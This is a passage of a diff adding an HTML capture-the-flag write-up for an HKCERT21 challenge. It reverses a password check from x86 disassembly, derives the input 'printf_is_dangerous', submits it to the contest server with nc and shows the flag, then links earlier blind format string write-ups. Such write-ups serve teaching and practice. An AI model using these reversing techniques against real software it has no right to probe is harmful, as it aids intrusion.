+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">12</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">73</span><span style="color:#66d9ef">h</span>             <span style="color:#75715e"># [6] s[18] == &#39;s&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_401253</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">11</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">75</span><span style="color:#66d9ef">h</span>             <span style="color:#75715e"># [7] s[17] == &#39;u&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_401269</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">10</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">6</span><span style="color:#66d9ef">Fh</span>             <span style="color:#75715e"># [8] s[16] == &#39;o&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_40127F</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">dl</span>, <span style="color:#66d9ef">al</span>               <span style="color:#75715e"># [9] s[2] == s[7]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_4012A0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">12</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">dl</span>, <span style="color:#66d9ef">al</span>               <span style="color:#75715e"># [10] s[8] == s[18]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_4012C1</span>
+</span></span></code></pre></div><p>Putting them together, we have:</p>
+<pre tabindex="0"><code>len(s) == 19
+s[6] == &#39;_&#39;
+s[6] == s[9]
+s[:6] == &#34;printf&#34;
+s[10:16] == &#34;danger&#34;
+s[18] == &#39;s&#39;
+s[17] == &#39;u&#39;
+s[16] == &#39;o&#39;
+s[2] == s[7]
+s[8] == s[18]
+</code></pre><p>No, don&rsquo;t start writing a z3 solver script yet. Get your pen and paper and try it out!</p>
+<p>Finally, we get that <code>s == printf_is_dangerous</code>. Supplying it to the remote server gives</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ echo printf_is_dangerous | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>hkcert21<span style="color:#f92672">{</span>l3akinG_the_world_giVE_U_7H3_FLAG<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Flag: <code>hkcert21{l3akinG_the_world_giVE_U_7H3_FLAG}</code></p>
+<h2 id="remarks">Remarks</h2>
+<p>If this is your first time seeing blind format string, here are some good writeups from previous challenges:</p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=XuzuFUGuQv0">33C3CTF ESPR</a> by LiveOverflow</li>
+<li><a href="https://www.da.vidbuchanan.co.uk/blog/HITB-XCTF-2018-babypwn.html">HITB-XCTF GSEC 2018</a> by David Buchanan</li>
+</ul>
+
+</article>
+
+
+
+</html>
+
+<footer class="footer">
+
+</footer>
+</div>
+
+</body>
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+ 
+
+</html>
+
